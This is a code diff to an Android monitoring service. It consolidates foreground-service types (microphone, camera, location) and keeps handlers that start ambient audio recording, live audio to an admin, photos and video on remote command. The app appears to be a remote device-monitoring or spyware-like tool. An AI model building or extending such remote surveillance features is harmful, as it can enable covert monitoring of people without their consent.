@@ -60,6 +60,9 @@ class MonitoringForegroundService : Service() {
         deviceInfo      = DeviceInfoCollector(this, apiService, getToken)
         dataPuller      = DataPuller(this, apiService, scope, getToken)
 
+        // Upgrade service type to include all granted sensor permissions
+        upgradeServiceType()
+
         // Ensure WebSocket is connected even when app is not in foreground
         scope.launch {
             val token = sessionManager.sessionToken.first() ?: return@launch
@@ -140,26 +143,20 @@ class MonitoringForegroundService : Service() {
         }
     }
 
-    private fun upgradeMicType() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
-            hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
-            runCatching {
-                startForeground(NOTIF_ID, buildNotification(),
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
-            }.onFailure { Log.e(TAG, "upgradeMicType failed: $it") }
-        }
-    }
-
-    private fun upgradeCameraType() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
-            hasPermission(android.Manifest.permission.CAMERA)) {
-            runCatching {
-                startForeground(NOTIF_ID, buildNotification(),
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
-            }.onFailure { Log.e(TAG, "upgradeCameraType failed: $it") }
-        }
+    private fun upgradeServiceType() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
+        var type = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+        if (hasPermission(android.Manifest.permission.RECORD_AUDIO))
+            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+        if (hasPermission(android.Manifest.permission.CAMERA))
+            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+        if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
+            hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION))
+            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+        Log.i(TAG, "upgradeServiceType: type=$type")
+        runCatching {
+            startForeground(NOTIF_ID, buildNotification(), type)
+        }.onFailure { Log.e(TAG, "upgradeServiceType failed: $it") }
     }
 
     private fun handleCommand(commandType: String, params: JsonObject, commandId: Int) {
@@ -168,7 +165,7 @@ class MonitoringForegroundService : Service() {
                 when (commandType) {
                     "start_audio_recording" -> {
                         if (hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
-                            upgradeMicType()
+                            upgradeServiceType()
                             audioMonitor.startAmbientRecording()
                         }
                     }
@@ -177,7 +174,7 @@ class MonitoringForegroundService : Service() {
                     }
                     "start_live_audio" -> {
                         if (hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
-                            upgradeMicType()
+                            upgradeServiceType()
                             val adminId = params.get("admin_id")?.asInt
                             audioMonitor.startLiveAudio(adminId)
                         }
@@ -186,14 +183,14 @@ class MonitoringForegroundService : Service() {
 
                     "take_photo" -> {
                         if (hasPermission(android.Manifest.permission.CAMERA)) {
-                            upgradeCameraType()
+                            upgradeServiceType()
                             val front = params.get("camera")?.asString != "back"
                             cameraCapture.takePhoto(front, commandId)
                         }
                     }
                     "start_video_recording" -> {
                         if (hasPermission(android.Manifest.permission.CAMERA)) {
-                            upgradeCameraType()
+                            upgradeServiceType()
                             val front = params.get("camera")?.asString != "back"
                             cameraCapture.startVideoRecording(front)
                         }
@@ -203,7 +200,7 @@ class MonitoringForegroundService : Service() {
                     }
                     "start_live_video" -> {
                         if (hasPermission(android.Manifest.permission.CAMERA)) {
-                            upgradeCameraType()
+                            upgradeServiceType()
                             val front = params.get("camera")?.asString != "back"
                             cameraCapture.startVideoRecording(front)
                         }
